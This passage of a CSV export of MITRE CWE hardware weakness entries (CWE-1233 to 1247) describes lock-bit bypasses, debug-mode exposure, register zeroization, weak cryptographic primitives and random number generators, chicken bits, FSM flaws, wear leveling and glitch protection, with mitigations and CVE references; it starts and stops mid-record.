ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Modify Memory:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Security Lock bit protections should be reviewed for behavior across supported power state transitions. Security lock programming flow and lock properties should be tested in pre-silicon and post-silicon testing including testing across power transitions.:EFFECTIVENESS:High::\",\"\",,,\"\",::166::,\"\",\n1233,\"Security-Sensitive Hardware Controls with Missing Lock Bit Protection\",Base,Stable,\"The product uses a register lock bit protection mechanism, but it does not ensure that the lock bit prevents modification of system registers or controls that perform changes to important hardware system configuration.\",\"Integrated circuits and hardware intellectual properties (IPs) might provide device configuration controls that need to be programmed after device power reset by a trusted firmware or software module, commonly set by BIOS/bootloader. After reset, there can be an expectation that the controls cannot be used to perform any further modification. This behavior is commonly implemented using a trusted lock bit, which can be set to disable writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration). However, if the lock bit does not effectively write-protect all system registers or controls that could modify the protected system configuration, then an adversary may be able to use software to access the registers/controls and modify the protected hardware configuration.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:667:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Modify Memory:NOTE:System Configuration protected by the lock bit can be modified even when the lock is set.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Set the lock bit. Attempt to modify the information protected by the lock bit. If the information is changed, implement a design fix. Retest. Also, attempt to indirectly clear the lock bit or bypass it.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Security lock bit protections must be reviewed for design inconsistency and common weaknesses. Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.::\",\"::REFERENCE:CVE-2018-9085:DESCRIPTION:Certain servers leave a write protection lock bit unset after boot, potentially allowing modification of parts of flash memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2018-9085::REFERENCE:CVE-2014-8273:DESCRIPTION:Chain: chipset has a race condition (CWE-362) between when an interrupt handler detects an attempt to write-enable the BIOS (in violation of the lock bit), and when the handler resets the write-enable bit back to 0, allowing attackers to issue BIOS writes during the timing window [REF-1237].:LINK:https://www.cve.org/CVERecord?id=CVE-2014-8273::\",,,\"\",::176::680::,\"\",\n1234,\"Hardware Internal or Debug Modes Allow Override of Locks\",Base,Incomplete,\"System configuration protection may be bypassed during debug mode.\",\"Device configuration controls are commonly programmed after a device power reset by a trusted firmware or software module (e.g., BIOS/bootloader) and then locked from any further modification. This is commonly implemented using a trusted lock bit, which when set, disables writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration). If debug features supported by hardware or internal modes/system states are supported in the hardware design, modification of the lock protection may be allowed allowing access and modification of configuration information.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:LIKELIHOOD:High:NOTE:Bypass of lock bit allows access and modification of system configuration even when the lock bit is set.::\",\"\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Security Lock bit protections should be reviewed for any bypass/override modes supported. Any supported override modes either should be removed or protected using authenticated debug modes. Security lock programming flow and lock properties should be tested in pre-silicon and post-silicon testing.:EFFECTIVENESS:High::\",\"\",,,\"\",::176::,\"\",\n1239,\"Improper Zeroization of Hardware Register\",Variant,Draft,\"The hardware product does not properly clear sensitive information from built-in registers when the user of the hardware block changes.\",\"Hardware logic operates on data stored in registers local to the hardware block. Most hardware IPs, including cryptographic accelerators, rely on registers to buffer I/O, store intermediate values, and interface with software. The result of this is that sensitive information, such as passwords or encryption keys, can exist in locations not transparent to the user of the hardware logic. When a different entity obtains access to the IP due to a change in operating mode or conditions, the new entity can extract information belonging to the previous user if no mechanisms are in place to clear register contents. It is important to clear information stored in the hardware if a physical attack on the product is detected, or if the user of the hardware block changes. The process of clearing register contents in a hardware IP is referred to as zeroization in standards for cryptographic hardware modules such as FIPS-140-2 [REF-267].\",::NATURE:ChildOf:CWE ID:226:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:226:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Lack of hardware mechanisms to zeroize or clear registers in the design or specification.::PHASE:Implementation:NOTE:Mechanisms to zeroize and clear registers are in the design but implemented incorrectly.::PHASE:Operation:NOTE:Hardware-provided zeroization mechanisms are not used appropriately by the IP user (ex. firmware), or data remanence issues are not taken into account.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Varies by Context:NOTE:The consequences will depend on the information disclosed due to the vulnerability.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Every register potentially containing sensitive information must have a policy specifying how and when information is cleared, in addition to clarifying if it is the responsibility of the hardware logic or IP user to initiate the zeroization procedure at the appropriate time.::\",\"\",,,\"\",::150::204::37::545::,\"\",\n1240,\"Use of a Cryptographic Primitive with a Risky Implementation\",Base,Draft,\"To fulfill the need for a cryptographic primitive, the product implements a cryptographic algorithm using a non-standard, unproven, or disallowed/non-compliant cryptographic implementation.\",\"Cryptographic protocols and systems depend on cryptographic primitives (and associated algorithms) as their basic building blocks. Some common examples of primitives are digital signatures, one-way hash functions, ciphers, and public key cryptography; however, the notion of primitive can vary depending on point of view. See Terminology Notes for further explanation of some concepts. Cryptographic primitives are defined to accomplish one very specific task in a precisely defined and mathematically reliable fashion. For example, suppose that for a specific cryptographic primitive (such as an encryption routine), the consensus is that the primitive can only be broken after trying out N different inputs (where the larger the value of N, the stronger the cryptography). For an encryption scheme like AES-256, one would expect N to be so large as to be infeasible to execute in a reasonable amount of time. If a vulnerability is ever found that shows that one can break a cryptographic primitive in significantly less than the expected number of attempts, then that primitive is considered weakened (or sometimes in extreme cases, colloquially it is broken). As a result, anything using this cryptographic primitive would now be considered insecure or risky. Thus, even breaking or weakening a seemingly small cryptographic primitive has the potential to render the whole system vulnerable, due to its reliance on the primitive. A historical example can be found in TLS when using DES. One would colloquially call DES the cryptographic primitive for transport encryption in this version of TLS. In the past, DES was considered strong, because no weaknesses were found in it; importantly, DES has a key length of 56 bits. Trying N=2^56 keys was considered impractical for most actors. Unfortunately, attacking a system with 56-bit keys is now practical via brute force, which makes defeating DES encryption practical. It is now practical for an adversary to read any information sent under this version of TLS and use this information to attack the system. As a result, it can be claimed that this use of TLS is weak, and that any system depending on TLS with DES could potentially render the entire system vulnerable to attack. Cryptographic primitives and associated algorithms are only considered safe after extensive research and review from experienced cryptographers from academia, industry, and government entities looking for any possible flaws. Furthermore, cryptographic primitives and associated algorithms are frequently reevaluated for safety when new mathematical and attack techniques are discovered. As a result and over time, even well-known cryptographic primitives can lose their compliance status with the discovery of novel attacks that might either defeat the algorithm or reduce its robustness significantly. If ad-hoc cryptographic primitives are implemented, it is almost certain that the implementation will be vulnerable to attacks that are well understood by cryptographers, resulting in the exposure of sensitive information and other consequences. This weakness is even more difficult to manage for hardware-implemented deployment of cryptographic algorithms. First, because hardware is not patchable as easily as software, any flaw discovered after release and production typically cannot be fixed without a recall of the product. Secondly, the hardware product is often expected to work for years, during which time computation power available to the attacker only increases. Therefore, for hardware implementations of cryptographic primitives, it is absolutely essential that only strong, proven cryptographic primitives are used.\",::NATURE:ChildOf:CWE ID:327:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness is primarily introduced during the architecture and design phase as risky primitives are included.::PHASE:Implementation:NOTE:Even in cases where the Architectural phase properly specifies a cryptographically secure design, the design may be changed during implementation due to unforeseen constraints.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:High:NOTE:Incorrect usage of crypto primitives could render the supposedly encrypted data as unencrypted plaintext in the worst case.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Review requirements, documentation, and product design to ensure that primitives are consistent with the strongest-available recommendations from trusted parties. If the product appears to be using custom or proprietary implementations that have not had sufficient public review and approval, then this is a significant concern.:EFFECTIVENESS:High::METHOD:Manual Analysis:DESCRIPTION:Analyze the product to ensure that implementations for each primitive do not contain any known vulnerabilities and are not using any known-weak algorithms, including MD4, MD5, SHA1, DES, etc.:EFFECTIVENESS:Moderate::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:For hardware, during the implementation (pre-Silicon / post-Silicon) phase, dynamic tests should be done to ensure that outputs from cryptographic routines are indeed working properly, such as test vectors provided by NIST [REF-1236].:EFFECTIVENESS:Moderate::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:It needs to be determined if the output of a cryptographic primitive is lacking entropy, which is one clear sign that something went wrong with the crypto implementation. There exist many methods of measuring the entropy of a bytestream, from sophisticated ones (like calculating Shannon's entropy of a sequence of characters) to crude ones (by compressing it and comparing the size of the original bytestream vs. the compressed - a truly random byte stream should not be compressible and hence the uncompressed and compressed bytestreams should be nearly identical in size).:EFFECTIVENESS:Moderate::\",\"::PHASE:Requirements:DESCRIPTION:Require compliance with the strongest-available recommendations from trusted parties, and require that compliance must be kept up-to-date, since recommendations evolve over time. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Ensure that the architecture/design uses the strongest-available primitives and algorithms from trusted parties. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. As with all cryptographic mechanisms, the source code should be available for analysis. If the algorithm may be compromised when attackers find out how it works, then it is especially weak.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Try not to use cryptographic algorithms in novel ways or with new modes of operation even when you know it is secure. For example, using SHA-2 chaining to create a 1-time pad for encryption might sound like a good idea, but one should not do this.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design can replace one cryptographic primitive or algorithm with another in the next generation (cryptographic agility). Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. This is especially important for hardware, which can be more difficult to upgrade quickly than software; design the hardware at a replaceable block level.:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design:DESCRIPTION:Do not use outdated or non-compliant cryptography algorithms. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong [REF-267].:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a linear-feedback shift register (LFSR) or other legacy methods as a substitute for an accepted and standard Random Number Generator.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a checksum as a substitute for a cryptographically generated hash.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted cryptographic library or framework. Industry-standard implementations will save development time and are more likely to avoid errors that can occur during implementation of cryptographic algorithms. However, the library/framework could be used incorrectly during implementation.:EFFECTIVENESS:High::PHASE:Architecture and Design Implementation:DESCRIPTION:When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for the prevention of common attacks.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not store keys in areas accessible to untrusted agents. Carefully manage and protect the cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography algorithm is irrelevant.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2020-4778:DESCRIPTION:software uses MD5, which is less safe than the default SHA-256 used by related products:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4778::REFERENCE:CVE-2005-2946:DESCRIPTION:Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2946::REFERENCE:CVE-2019-3907:DESCRIPTION:identity card uses MD5 hash of a salt and password:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3907::REFERENCE:CVE-2021-34687:DESCRIPTION:personal key is transmitted over the network using a substitution cipher:LINK:https://www.cve.org/CVERecord?id=CVE-2021-34687::REFERENCE:CVE-2020-14254:DESCRIPTION:product does not disable TLS-RSA cipher suites, allowing decryption of traffic if TLS 2.0 and secure ciphers are not enabled.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-14254::REFERENCE:CVE-2019-1543:DESCRIPTION:SSL/TLS library generates 16-byte nonces but reduces them to 12 byte nonces for the ChaCha20-Poly1305 cipher, converting them in a way that violates the cipher's requirements for unique nonces.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1543::REFERENCE:CVE-2017-9267:DESCRIPTION:LDAP interface allows use of weak ciphers:LINK:https://www.cve.org/CVERecord?id=CVE-2017-9267::REFERENCE:CVE-2017-7971:DESCRIPTION:SCADA product allows use of outdated cipher suites:LINK:https://www.cve.org/CVERecord?id=CVE-2017-7971::REFERENCE:CVE-2020-6616:DESCRIPTION:Chip implementing Bluetooth uses a low-entropy PRNG instead of a hardware RNG, allowing spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-6616::REFERENCE:CVE-2019-1715:DESCRIPTION:security product has insufficient entropy in the DRBG, allowing collisions and private key discovery:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1715::REFERENCE:CVE-2014-4192:DESCRIPTION:Dual_EC_DRBG implementation in RSA toolkit does not correctly handle certain byte requests, simplifying plaintext recovery:LINK:https://www.cve.org/CVERecord?id=CVE-2014-4192::REFERENCE:CVE-2007-6755:DESCRIPTION:Recommendation for Dual_EC_DRBG algorithm contains point Q constants that could simplify decryption:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6755::\",,,\"\",::97::,\"::TYPE:Terminology:NOTE:Terminology for cryptography varies widely, from informal and colloquial to mathematically-defined, with different precision and formalism depending on whether the stakeholder is a developer, cryptologist, etc. Yet there is a need for CWE to be self-consistent while remaining understandable and acceptable to multiple audiences. As of CWE 4.6, CWE terminology around primitives and algorithms is emerging as shown by the following example, subject to future consultation and agreement within the CWE and cryptography communities. Suppose one wishes to send encrypted data using a CLI tool such as OpenSSL. One might choose to use AES with a 256-bit key and require tamper protection (GCM mode, for instance). For compatibility's sake, one might also choose the ciphertext to be formatted to the PKCS#5 standard. In this case, the cryptographic system would be AES-256-GCM with PKCS#5 formatting. The cryptographic function would be AES-256 in the GCM mode of operation, and the algorithm would be AES. Colloquially, one would say that AES (and sometimes AES-256) is the cryptographic primitive, because it is the algorithm that realizes the concept of symmetric encryption (without modes of operation or other protocol related modifications). In practice, developers and architects typically refer to base cryptographic algorithms (AES, SHA, etc.) as cryptographic primitives.::TYPE:Maintenance:NOTE:Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.::\",\n1241,\"Use of Predictable Algorithm in Random Number Generator\",Base,Draft,\"The device uses an algorithm that is predictable and generates a pseudo-random number.\",\"Pseudo-random number generator algorithms are predictable because their registers have a finite number of possible states, which eventually lead to repeating patterns. As a result, pseudo-random number generators (PRNGs) can compromise their randomness or expose their internal state to various attacks, such as reverse engineering or tampering. It is highly recommended to use hardware-based true random number generators (TRNGs) to ensure the security of encryption schemes. TRNGs generate unpredictable, unbiased, and independent random numbers because they employ physical phenomena, e.g., electrical noise, as sources to generate random numbers.\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:In many cases, the design originally defines a cryptographically secure random number generator, but is then changed during implementation due to unforeseen constraints.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:A true random number generator should be specified for cryptographic algorithms.::PHASE:Implementation:DESCRIPTION:A true random number generator should be implemented for cryptographic algorithms.::\",\"::REFERENCE:CVE-2021-3692:DESCRIPTION:PHP framework uses mt_rand() function (Marsenne Twister) when generating tokens:LINK:https://www.cve.org/CVERecord?id=CVE-2021-3692::\",,,\"\",::97::,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n1242,\"Inclusion of Undocumented Features or Chicken Bits\",Base,Incomplete,\"The device includes chicken bits or undocumented features that can create entry points for unauthorized actors.\",\"A common design practice is to use undocumented bits on a device that can be used to disable certain functional security features. These bits are commonly referred to as chicken bits. They can facilitate quick identification and isolation of faulty components, features that negatively affect performance, or features that do not provide the required controllability for debug and test. Another way to achieve this is through implementation of undocumented features. An attacker might exploit these interfaces for unauthorized access.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Documentation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:The implementation of chicken bits in a released product is highly discouraged. If implemented at all, ensure that they are disabled in production devices. All interfaces to a device should be documented.:EFFECTIVENESS:High::\",\"\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-4::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.12::\",::212::36::,\"\",\n1243,\"Sensitive Non-Volatile Information Not Protected During Debug\",Base,Incomplete,\"Access to security-sensitive information stored in fuses is not limited during debug.\",\"Several security-sensitive values are programmed into fuses to be used during early-boot flows or later at runtime. Examples of these security-sensitive values include root keys, encryption keys, manufacturing-specific information, chip-manufacturer-specific information, and original-equipment-manufacturer (OEM) data. After the chip is powered on, these values are sensed from fuses and stored in temporary locations such as registers and local memories. These locations are typically access-control protected from untrusted agents capable of accessing them. Even to trusted agents, only read-access is provided. However, these locations are not blocked during debug operations, allowing a user to access this sensitive information.\",::NATURE:ChildOf:CWE ID:1263:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Disable access to security-sensitive information stored in fuses directly and also reflected from temporary storage locations when in debug mode.::\",\"\",,,\"\",::116::545::,\"\",\n1244,\"Internal Asset Exposed to Unsafe Debug Access Level or State\",Base,Stable,\"The product uses physical debug or test interfaces with support for multiple access levels, but it assigns the wrong debug access level to an internal asset, providing unintended access to the asset from untrusted debug agents.\",\"Debug authorization can have multiple levels of access, defined such that different system internal assets are accessible based on the current authorized debug level. Other than debugger authentication (e.g., using passwords or challenges), the authorization can also be based on the system state or boot stage. For example, full system debug access might only be allowed early in boot after a system reset to ensure that previous session data is not accessible to the authenticated debugger. If this protection mechanism does not ensure that internal assets have the correct debug access level during each boot stage or change in system state, an attacker could obtain sensitive information from the internal asset using a debugger.\",::NATURE:ChildOf:CWE ID:863:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory::SCOPE:Integrity:IMPACT:Modify Memory::SCOPE:Authorization:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Manual Analysis:DESCRIPTION:Check 2 devices for their passcode to authenticate access to JTAG/debugging ports. If the passcodes are missing or the same, update the design to fix and retest. Check communications over JTAG/debugging ports for encryption. If the communications are not encrypted, fix the design and retest.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:For security-sensitive assets accessible over debug/test interfaces, only allow trusted agents.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Apply blinding [REF-1219] or masking techniques in strategic areas.:EFFECTIVENESS:Limited::PHASE:Implementation:DESCRIPTION:Add shielding or tamper-resistant protections to the device, which increases the difficulty and cost for accessing debug/test interfaces.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2019-18827:DESCRIPTION:After ROM code execution, JTAG access is disabled. But before the ROM code is executed, JTAG access is possible, allowing a user full system access. This allows a user to modify the boot flow and successfully bypass the secure-boot process.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-18827::\",,,\"\",::114::,\"::TYPE:Relationship:NOTE:CWE-1191 and CWE-1244 both involve physical debug access, but the weaknesses are different. CWE-1191 is effectively about missing authorization for a debug interface, i.e. JTAG. CWE-1244 is about providing internal assets with the wrong debug access level, exposing the asset to untrusted debug agents.::\",\n1245,\"Improper Finite State Machines (FSMs) in Hardware Logic\",Base,Incomplete,\"Faulty finite state machines (FSMs) in the hardware logic allow an attacker to put the system in an undefined state, to cause a denial of service (DoS) or gain privileges on the victim's system.\",\"The functionality and security of the system heavily depend on the implementation of FSMs. FSMs can be used to indicate the current security state of the system. Lots of secure data operations and data transfers rely on the state reported by the FSM. Faulty FSM designs that do not account for all states, either through undefined states (left as don't cares) or through incorrect implementation, might lead an attacker to drive the system into an unstable state from which the system cannot recover without a reset, thus causing a DoS. Depending on what the FSM is used for, an attacker might also gain additional privileges to launch further attacks and compromise the security guarantees.\",::NATURE:ChildOf:CWE ID:684:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Access Control:IMPACT:Unexpected State:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Instability:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Define all possible states and handle all unused states through default statements. Ensure that system defaults to a secure state.:EFFECTIVENESS:High::\",\"\",,,\"\",::74::,\"\",\n1246,\"Improper Write Handling in Limited-write Non-Volatile Memories\",Base,Incomplete,\"The product does not implement or incorrectly implements wear leveling operations in limited-write non-volatile memories.\",\"Non-volatile memories such as NAND Flash, EEPROM, etc. have individually erasable segments, each of which can be put through a limited number of program/erase or write cycles. For example, the device can only endure a limited number of writes, after which the device becomes unreliable. In order to wear out the cells in a uniform manner, non-volatile memory and storage products based on the above-mentioned technologies implement a technique called wear leveling. Once a set threshold is reached, wear leveling maps writes of a logical block to a different physical block. This prevents a single physical block from prematurely failing due to a high concentration of writes. If wear leveling is improperly implemented, attackers may be able to programmatically cause the storage to become unreliable within a much shorter time than would normally be expected.\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Storage Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Instability::\",\"\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Include secure wear leveling algorithms and ensure they may not be bypassed.:EFFECTIVENESS:High::\",\"\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-4::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::\",::212::,\"\",\n1247,\"Improper Protection Against Voltage and Clock Glitches\",Base,Stable,\"The device does not contain or contains incorrectly implemented circuitry or sensors to detect and mitigate voltage and clock glitches and protect sensitive information or software contained on the device.\",\"A device might support features such as secure boot which are supplemented with hardware and firmware support. This involves establishing a chain of trust, starting with an immutable root of trust by checking the signature of the next stage (culminating with the OS and runtime software) against a golden value before transferring control. The intermediate stages typically set up the system in a secure state by configuring several access control settings. Similarly, security logic for exercising a debug or testing interface may be implemented in hardware, firmware, or both. A device needs to guard against fault attacks such as voltage glitches and clock glitches that an attacker may employ in an attempt to compromise the system.\",::NATURE:ChildOf:CWE ID:1384:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY 